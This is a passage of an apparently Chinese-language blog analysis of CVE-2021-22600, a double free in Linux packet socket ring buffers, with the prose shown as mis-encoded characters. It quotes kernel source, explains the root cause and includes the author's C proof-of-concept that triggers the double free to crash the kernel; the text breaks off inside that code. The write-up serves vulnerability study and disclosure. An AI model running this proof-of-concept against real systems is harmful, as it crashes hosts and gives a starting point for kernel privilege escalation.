å°„ï¼Œçœç•¥äº†ä¼ ç»Ÿçš„é€šè¿‡ç¼ºé¡µä¸­æ–­æ’å…¥é¡µé¢çš„è¿‡ç¨‹çš„é¡µé¢è®¿é—®å¼€é”€ï¼š</p><blockquote><p>&#x2F;net&#x2F;packet&#x2F;af_packet.c</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">packet_mmap</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-keyword">struct</span> socket *sock,</span><br><span class="hljs-params"><span class="hljs-keyword">struct</span> vm_area_struct *vma)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock</span> *<span class="hljs-title">sk</span> =</span> sock-&gt;sk;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">packet_sock</span> *<span class="hljs-title">po</span> =</span> pkt_sk(sk);<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> size, expected_size;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">packet_ring_buffer</span> *<span class="hljs-title">rb</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> start;<br><span class="hljs-type">int</span> err = -EINVAL;<br><span class="hljs-type">int</span> i;<br><br><span class="hljs-keyword">if</span> (vma-&gt;vm_pgoff)<br><span class="hljs-keyword">return</span> -EINVAL;<br><br>mutex_lock(&amp;po-&gt;pg_vec_lock);<br><br>expected_size = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (rb = &amp;po-&gt;rx_ring; rb &lt;= &amp;po-&gt;tx_ring; rb++) &#123;<br><span class="hljs-keyword">if</span> (rb-&gt;pg_vec) &#123;<br>expected_size += rb-&gt;pg_vec_len<br>* rb-&gt;pg_vec_pages<br>* PAGE_SIZE;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (expected_size == <span class="hljs-number">0</span>)<br><span class="hljs-keyword">goto</span> out;<br><br>size = vma-&gt;vm_end - vma-&gt;vm_start;<br><span class="hljs-keyword">if</span> (size != expected_size)<br><span class="hljs-keyword">goto</span> out;<br><br>start = vma-&gt;vm_start;<br><span class="hljs-keyword">for</span> (rb = &amp;po-&gt;rx_ring; rb &lt;= &amp;po-&gt;tx_ring; rb++) &#123;<br><span class="hljs-keyword">if</span> (rb-&gt;pg_vec == <span class="hljs-literal">NULL</span>)<br><span class="hljs-keyword">continue</span>;<br><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; rb-&gt;pg_vec_len; i++) &#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">void</span> *kaddr = rb-&gt;pg_vec[i].buffer;<br><span class="hljs-type">int</span> pg_num;<br><br><span class="hljs-keyword">for</span> (pg_num = <span class="hljs-number">0</span>; pg_num &lt; rb-&gt;pg_vec_pages; pg_num++) &#123;<br>page = pgv_to_page(kaddr);<br>err = vm_insert_page(vma, start, page);<br><span class="hljs-keyword">if</span> (unlikely(err))<br><span class="hljs-keyword">goto</span> out;<br>start += PAGE_SIZE;<br>kaddr += PAGE_SIZE;<br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-type">atomic_inc</span>(&amp;po-&gt;mapped);<br>vma-&gt;vm_ops = &amp;packet_mmap_ops;<br>err = <span class="hljs-number">0</span>;<br><br>out:<br>mutex_unlock(&amp;po-&gt;pg_vec_lock);<br><span class="hljs-keyword">return</span> err;<br>&#125;<br></code></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„æ˜¯åœ¨ <code>vm_insert_page()</code> ä¸­ä¼šå¯¹é¡µé¢ç±»å‹è¿›è¡Œæ£€æŸ¥ï¼Œéœ€è¦æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š</p><ul><li>ä¸æ˜¯åŒ¿åé¡µï¼ˆé˜»æ­¢æˆ‘ä»¬æ˜ å°„è¿›ç¨‹ä¸­ä¸ä¸æ–‡ä»¶å…³è”çš„é¡µé¢ï¼Œä¾‹å¦‚å †å’Œæ ˆï¼‰</li><li>ä¸æ˜¯ Slab é¡µé¢ï¼ˆé˜»æ­¢æˆ‘ä»¬æ˜ å°„å·²ç»åˆ†é…ç»™ slab å­ç³»ç»Ÿçš„å†…æ ¸æ™®é€šå †å¯¹è±¡ï¼‰</li><li>ä¸æ˜¯æœ‰ç±»å‹çš„é¡µé¢ï¼ˆé˜»æ­¢æˆ‘ä»¬æ˜ å°„å†…æ ¸ä¸­ç”¨äºç‰¹æ®Šç›®çš„çš„ç‰©ç†é¡µï¼Œå¦‚ ZRAM é¡µé¢ï¼‰</li></ul><p>ä¸è¿‡ä» buddy system ç›´æ¥åˆ†é…çš„ç©ºé—²é¡µé¢æ­£å¸¸æƒ…å†µä¸‹éƒ½æ»¡è¶³è¿™äº›è¦æ±‚</p><blockquote><p>&#x2F;mm&#x2F;memory.c</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">validate_page_before_insert</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> page *page)</span><br>&#123;<br><span class="hljs-keyword">if</span> (PageAnon(page) || PageSlab(page) || page_has_type(page))<br><span class="hljs-keyword">return</span> -EINVAL;<br>flush_dcache_page(page);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">insert_page</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> vm_area_struct *vma, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr,</span><br><span class="hljs-params"><span class="hljs-keyword">struct</span> page *page, <span class="hljs-type">pgprot_t</span> prot)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> vma-&gt;vm_mm;<br><span class="hljs-type">int</span> retval;<br><span class="hljs-type">pte_t</span> *pte;<br><span class="hljs-type">spinlock_t</span> *ptl;<br><br>retval = validate_page_before_insert(page);<br><span class="hljs-keyword">if</span> (retval)<br><span class="hljs-keyword">goto</span> out;<br>retval = -ENOMEM;<br>pte = get_locked_pte(mm, addr, &amp;ptl);<br><span class="hljs-keyword">if</span> (!pte)<br><span class="hljs-keyword">goto</span> out;<br>retval = insert_page_into_pte_locked(mm, pte, addr, page, prot);<br>pte_unmap_unlock(pte, ptl);<br>out:<br><span class="hljs-keyword">return</span> retval;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">vm_insert_page</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> vm_area_struct *vma, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr,</span><br><span class="hljs-params"><span class="hljs-keyword">struct</span> page *page)</span><br>&#123;<br><span class="hljs-keyword">if</span> (addr &lt; vma-&gt;vm_start || addr &gt;= vma-&gt;vm_end)<br><span class="hljs-keyword">return</span> -EFAULT;<br><span class="hljs-keyword">if</span> (!page_count(page))<br><span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-keyword">if</span> (!(vma-&gt;vm_flags &amp; VM_MIXEDMAP)) &#123;<br>BUG_ON(mmap_read_trylock(vma-&gt;vm_mm));<br>BUG_ON(vma-&gt;vm_flags &amp; VM_PFNMAP);<br>vma-&gt;vm_flags |= VM_MIXEDMAP;<br>&#125;<br><span class="hljs-keyword">return</span> insert_page(vma, addr, page, vma-&gt;vm_page_prot);<br>&#125;<br>EXPORT_SYMBOL(vm_insert_page);<br></code></pre></td></tr></table></figure><h1 id="0x01-æ¼æ´åˆ†æ"><a href="#0x01-æ¼æ´åˆ†æ" class="headerlink" title="0x01. æ¼æ´åˆ†æ"></a>0x01. æ¼æ´åˆ†æ</h1><p>è™½ç„¶ç‰ˆæœ¬çš„éšæ„åˆ‡æ¢ç»™ Packet Socket å¸¦æ¥äº†éå¸¸é«˜çš„çµæ´»æ€§ï¼Œä½†ä¹Ÿå¸¦æ¥äº†ä¸å°çš„é£é™©</p><h2 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h2><p>æ³¨æ„åˆ° V1 å’Œ V2 ä½¿ç”¨çš„ <code>packet_ring_buffer::rx_owner_map</code> å’Œ V3 ä½¿ç”¨çš„ <code>packet_ring_buffer::prb_bdqc</code> å…±äº«åŒä¸€è”åˆä½“å­—æ®µï¼Œä¸”å­˜æ”¾ <code>rx_owner_map</code> çš„ <code>packet_ring_buffer::rx_owner_map</code> å’Œå­˜æ”¾ <code>pgv</code> çš„ <code>packet_ring_buffer::prb_bdqc::pkbdq</code> ä½äºç»“æ„ä½“ä¸­çš„åŒä¸€åç§»ï¼Œè€Œ <strong>packet socket çš„ç‰ˆæœ¬åˆ‡æ¢å¹¶æ²¡æœ‰é™åˆ¶</strong> ï¼Œé‚£ä¹ˆä¾¿ä¼šå­˜åœ¨å¦‚ä¸‹æƒ…å†µï¼š</p><ul><li>é¦–å…ˆåœ¨ V3 ä¸‹ç”¨ setsockopt åˆ›å»ºä¸€ä¸ª <code>RX ring buffer</code>  ï¼Œæ­¤æ—¶ <code>pgv</code> è¢«åŒæ—¶å­˜åœ¨ RX ring çš„ <code>packet_ring_buffer::pg_vec</code> å’Œ <code>packet_ring_buffer::prb_bdqc::pkbdq</code></li><li>æ¥ä¸‹æ¥ç”¨ setsockopt é‡Šæ”¾æ‰ <code>packet_ring_buffer::pg_vec</code> ï¼Œæ­¤æ—¶  <code>packet_ring_buffer::prb_bdqc::pkbdq</code>ä¾æ—§ä¿ç•™ç€å¯¹æ—§çš„ <code>pgv</code> çš„è®°å½•</li><li>æ¥ä¸‹æ¥ç”¨ setsockopt åˆ‡æ¢åˆ° V2ï¼Œå†ç”¨ setsockopt åˆ›å»ºä¸€ä¸ª <code>RX ring buffer</code>  ï¼Œ <strong>æ­¤æ—¶åœ¨ packet_ring_buffer::prb_bdqc::pkbdq ä¸­ä»å­˜æœ‰çš„æ—§çš„ pgv è®°å½• ä¾¿ä¼šè¢«å½“ä½œ packet_ring_buffer::rx_owner_map ç»™é‡Šæ”¾æ‰</strong> ï¼Œè€Œ <code>packet_ring_buffer::pg_vec</code> æœ¬èº«ä¹Ÿä¼šè¢«é‡Šæ”¾æ‰ï¼Œå› æ­¤è¿™ä¸ªå†…æ ¸å¯¹è±¡ <strong>ä¾¿ä¼šè¢«é‡Šæ”¾ä¸¤æ¬¡</strong></li></ul><p>ç”±æ­¤æˆ‘ä»¬ä¾¿æœ‰äº†ä¸€ä¸ª double free çš„æ¼æ´</p><blockquote><p>è¯´å®è¯ç¬”è€…è§‰å¾—è¿™ b æ´çº¯ç²¹æ˜¯çœç©ºé—´çœé­”æ€”äº†ç¡¬è¦ä¸Šè”åˆä½“å¯¼è‡´çš„ï¼Œä½ è¦è¯´ <code>page</code> è¿™ç§æ•°é‡å·¨å¤§ä¸”ç”¨é€”ç‰¹åˆ«å¤šçš„ç»“æ„ä½“ä¸ºäº†å‹ç¼©ç©ºé—´æå„ç§å¤åˆè”åˆä½“é‚£ğŸ‘´4ï¸âƒ£è®¤å¯çš„ï¼Œtm çš„ä¸€ä¸ª <code>packet_ring_buffer</code> åˆä¸ä¼šè¢«å¤§é‡åˆ†é…ï¼Œ <strong>çœŸæœ‰å¿…è¦çœè¿™ 8 ä¸ªå­—èŠ‚ï¼Ÿ</strong></p></blockquote><h2 id="Proof-Of-Concept"><a href="#Proof-Of-Concept" class="headerlink" title="Proof-Of-Concept"></a>Proof-Of-Concept</h2><p>è¿™é‡Œç¬”è€…ç»™å‡ºè‡ªå·±å†™çš„ POCï¼Œä¸»è¦å°±æ˜¯ç›´æ¥ç”¨ Double Free é€ æˆ kernel crashï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Copyright (c) 2025 arttnba3 &lt;arttnba@gmail.com&gt;</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * This work is licensed under the terms of the GNU GPL, version 2 or later.</span><br><span class="hljs-comment">**/</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> IS_ERR</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IS_ERR(ptr) ((uintptr_t) ptr &gt;= (uintptr_t) -4095UL)</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> PTR_ERR</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTR_ERR(ptr) ((int) (intptr_t) ptr)</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SUCCESS_MSG(msg) <span class="hljs-string">&quot;\033[32m\033[1m&quot;</span> msg <span class="hljs-string">&quot;\033[0m&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INFO_MSG(msg) <span class="hljs-string">&quot;\033[34m\033[1m&quot;</span> msg <span class="hljs-string">&quot;\033[0m&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERR_MSG(msg) <span class="hljs-string">&quot;\033[31m\033[1m&quot;</span> msg <span class="hljs-string">&quot;\033[0m&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> log_success(msg)    puts(SUCCESS_MSG(msg))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> log_info(msg)       puts(INFO_MSG(msg))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> log_error(msg)      puts(ERR_MSG(msg))</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(ERR_MSG(<span class="hljs-string">&quot;[x] Error at: &quot;</span>) <span class="hljs-string">&quot;%s\n&quot;</span>, msg);<br>    sleep(<span class="hljs-number">5</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_core</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br><br>    <span class="hljs-built_in">printf</span>(INFO_MSG(<span class="hljs-string">&quot;[*] Process binded to core: &quot;</span>) <span class="hljs-string">&quot;%d\n&quot;</span>, core);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">unshare_setup</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">char</span> edit[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-type">int</span> tmp_fd;<br><br>    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);<br><br>    tmp_fd = open(<span class="hljs-string">&quot;/proc/self/setgroups&quot;</span>, O_WRONLY);<br>    write(tmp_fd, <span class="hljs-string">&quot;deny&quot;</span>, <span class="hljs-built_in">strlen</span>(<span class="hljs-string">&quot;deny&quot;</span>));<br>    close(tmp_fd);<br><br>    tmp_fd = open(<span class="hljs-string">&quot;/proc/self/uid_map&quot;</span>, O_WRONLY);<br>    <span class="hljs-built_in">snprintf</span>(edit, <span class="hljs-keyword">sizeof</span>(edit), <span class="hljs-string">&quot;0 %d 1&quot;</span>, getuid());<br>    write(tmp_fd, edit, <span class="hljs-built_in">strlen</span>(edit));<br>    close(tmp_fd);<br><br>    tmp_fd = open(<span class="hljs-string">&quot;/proc/self/gid_map&quot;</span>, O_WRONLY);<br>    <span class="hljs-built_in">snprintf</span>(edit, <span class="hljs-keyword">sizeof</span>(edit), <span class="hljs-string">&quot;0 %d 1&quot;</span>, getgid());<br>    write(tmp_fd, edit, <span class="hljs-built_in">strlen</span>(edit));<br>    close(tmp_fd);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">print_banner</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-built_in">puts</span>(SUCCESS_MSG(<span class="hljs-string">&quot;-------- CVE-2021-22600 Proof-of-concet --------&quot;</span>));<br>    <span class="hljs-built_in">puts</span>(INFO_MSG(<span class="hljs-string">&quot;-------\t\t Author: &quot;</span>) <span class="hljs-string">&quot;arttnba3&quot;</span> INFO_MSG(<span class="hljs-string">&quot; \t-------&quot;</span>));<br>    <span class="hljs-built_in">puts</span>(SUCCESS_MSG(<span class="hljs-string">&quot;-----------------------------------------------\n&quot;</span>));<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tpacket_req</span> &#123;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_block_size;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_block_nr;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_frame_size;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_frame_nr;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_retire_blk_tov;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_sizeof_priv;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_feature_req_word;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">tpacket_versions</span> &#123;</span><br>    TPACKET_V1,<br>    TPACKET_V2,<br>    TPACKET_V3,<br>&#125;;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PACKET_RX_RING 5</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PACKET_VERSION 10</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PACKET_TX_RING 13</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">proof_of_concept</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tpacket_req</span> <span class="hljs-title">req</span>;</span><br>    <span class="hljs-type">int</span> socket_fd, version;<br>    <span class="hljs-type">int</span> ret;<br><br>    print_banner();<br><br>    log_info(<span class="hljs-string">&quot;[*] Prepare env...&quot;</span>);<br>    <br>    bind_core(<span class="hljs-number">0</span>);<br><br>    unshare_setup();<br><br>    log_info(<span class="hljs-string">&quot;[*] Creating packet socket...&quot;</span>);<br><br>    socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);<br>    <span class="hljs-keyword">if</span> (socket_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        log_error(<span class="hljs-string">&quot;[x] failed at socket(AF_PACKET, SOCK_RAW, PF_PACKET)&quot;</span>);<br>        err_exit(<span class="hljs-string">&quot;FAILED to create socket&quot;</span>);<br>    &#125;<br><br>    log_info(<span class="hljs-string">&quot;[*] Creating V3 RX ring buffer...&quot;</span>);<br><br>    version = TPACKET_V3;<br>    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION, <br>                     &amp;version, <span class="hljs-keyword">sizeof</span>(version));<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        log_error(<span class="hljs-string">&quot;[x] failed at setsockopt(PACKET_VERSION)&quot;</span>);<br>        err_exit(<span class="hljs-string">&quot;FAILED to use setsockopt to set TPACKET_V3&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">memset</span>(&amp;req, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(req));<br>    req.tp_block_size = <span class="hljs-number">0x1000</span>;<br>    req.tp_block_nr = <span class="hljs-number">1</span>;<br>    req.tp_frame_size = <span class="hljs-number">0x1000</span>;<br>    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;<br><br>    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_RX_RING, &amp;req, <span class="hljs-keyword">sizeof</span>(req));<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;[x] failed at setsockopt(PACKET_RX_RING)&quot;</span>);<br>        err_exit(<span class="hljs-string">&quot;FAILED to allocate RX ring buffer&quot;</span>);<br>    &#125;<br><br>    log_info(<span class="hljs-string">&quot;[*] Freeing pgv...&quot;</span>);<br><br>    req.tp_block_size = <span class="hljs-number">0x3361626e</span>;<br>    req.tp_block_nr = <span class="hljs-number">0</span>;<br>    req.tp_frame_size = <span class="hljs-number">0x74747261</span>;<br>    req.tp_frame_nr = <span class="hljs-number">0</span>;<br><br>    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_RX_RING, &amp;req, <span class="hljs-keyword">sizeof</span>(req));<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;[x] failed at setsockopt(PACKET_RX_RING)&quot;</span>);<br>        err_exit(<span class="hljs-string">&quot;FAILED to free RX ring buffer&quot;</span>);<br>    &#125;<br><br>    log_info(<span class="hljs-string">&quot;[*] Switing to V2 socket...&quot;</span>);<br><br>    version = TPACKET_V2;<br>    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION, <br>                     &amp;version, <span class="hljs-keyword">sizeof</span>(version));<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;[x] failed at setsockopt(PACKET_VERSION)&quot;</span>);<br>        err_exit(<span class="hljs-string">&quot;FAILED to use setsockopt to set TPACKET_V2&quot;</span>);<br>    &#125;<br><br>    log_info(<span class="hljs-string">&quot;[*] Freeing V2 rx_owner_map to trigger direct double free...&quot;</span>);<br><br>    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_RX_RING, &amp;req, <span class="hljs-keyword">sizeof</span>(req));<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;[x] failed at setsockopt(PACKET_RX_RING)&quot;</span>);<br>        err_exit(<span class="hljs-string">&quot;FAILED to 